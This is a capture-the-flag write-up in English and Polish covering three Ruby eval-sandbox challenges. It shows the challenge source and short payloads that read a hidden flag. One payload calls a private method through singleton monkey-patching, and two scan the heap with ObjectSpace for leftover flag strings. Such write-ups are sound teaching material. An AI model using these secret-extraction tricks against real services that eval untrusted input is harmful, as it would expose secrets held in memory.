## Private/Local/Comment (PPC, 50+70+100p)

###ENG
[PL](#pl-version)

Set of three tasks where we can execute some Ruby code to steal the flag.

#### Private

First task has code:

```ruby
require_relative 'restrict'
Restrict.set_timeout

class Private
  private
  public_methods.each do |method|
    eval "def #{method.to_s};end"
  end

  def flag
    return "TWCTF{CENSORED}"
  end
end

p = Private.new
Private = nil

input = STDIN.gets
fail unless input
input.size > 24 && input = input[0, 24]

Restrict.seccomp

STDOUT.puts eval(input)
```

So we can provide 24 characters and we need to get the value returned by `flag` method.
We can't call the method since all methods are now private.
To solve it we use a trick - we monkey patch a new method to the instance `p` and from this method we can call also private methods so exploit is:

```ruby
def p.x;flag end;p.x
```

#### Local & Comment

Attack for both of those was the same.

The code for local was

```ruby
require_relative 'restrict'
Restrict.set_timeout

def get_flag(x)
  flag = "TWCTF{CENSORED}"
  x
end

input = STDIN.gets
fail unless input
input.size > 60 && input = input[0, 60]

Restrict.seccomp

STDOUT.puts get_flag(eval(input))
```

and for comment was:

```ruby
require_relative 'restrict'
Restrict.set_timeout

input = STDIN.gets
fail unless input
input.size > 60 && input = input[0, 60]

require_relative 'comment_flag'
Restrict.seccomp

STDOUT.puts eval(input)
```

```ruby
# FLAG is TWCTF{CENSORED}
```

In both cases we searched the heap memory looking for the flag string stored in not-yet garbage collected memory using `ObjectSpace`:

For local:
```ruby
ObjectSpace.each_object(String){|x|x[3]=="T"and print x}
```

And for comment:
```ruby
ObjectSpace.each_object(String){|x|x[15]=='{'and print x}
```

###PL version

Zestaw 3 zadań w których możemy wykonać pewien kod Ruby aby ukraść flagę.

#### Private

Kod do pierwszego zadania:

```ruby
require_relative 'restrict'
Restrict.set_timeout

class Private
  private
  public_methods.each do |method|
    eval "def #{method.to_s};end"
  end

  def flag
    return "TWCTF{CENSORED}"
  end
end

p = Private.new
Private = nil

input = STDIN.gets
fail unless input
input.size > 24 && input = input[0, 24]

Restrict.seccomp

STDOUT.puts eval(input)
```

Możemy wysłać 24 znaki żeby pobrać wynik metody `flag`.
Nie możemy jej po prostu wywołać bo jest prywatna.
Aby obejść nasz problem definiujemy nową metodę instancji `p` za pomocą monkey-patchingu i z tejże metody możemy wołać juz metody prywatne:

```ruby
def p.x;flag end;p.x
```

#### Local & Comment

Atak dla obu zadań był taki sam.

Kod dla local:

```ruby
require_relative 'restrict'
Restrict.set_timeout

def get_flag(x)
  flag = "TWCTF{CENSORED}"
  x
end

input = STDIN.gets
fail unless input
input.size > 60 && input = input[0, 60]

Restrict.seccomp

STDOUT.puts get_flag(eval(input))
```

i dla comment:

```ruby
require_relative 'restrict'
Restrict.set_timeout

input = STDIN.gets
fail unless input
input.size > 60 && input = input[0, 60]

require_relative 'comment_flag'
Restrict.seccomp

STDOUT.puts eval(input)
```

```ruby
# FLAG is TWCTF{CENSORED}
```

W obu przypadkach przeglądneliśmy stertę w poszukiwaniu stringa z flagą w jeszcze nie zwolnionej pamięci za pomocą `ObjectSpace`:

Dla local:
```ruby
ObjectSpace.each_object(String){|x|x[3]=="T"and print x}
```

Dla comment:
```ruby
ObjectSpace.each_object(String){|x|x[15]=='{'and print x}
```
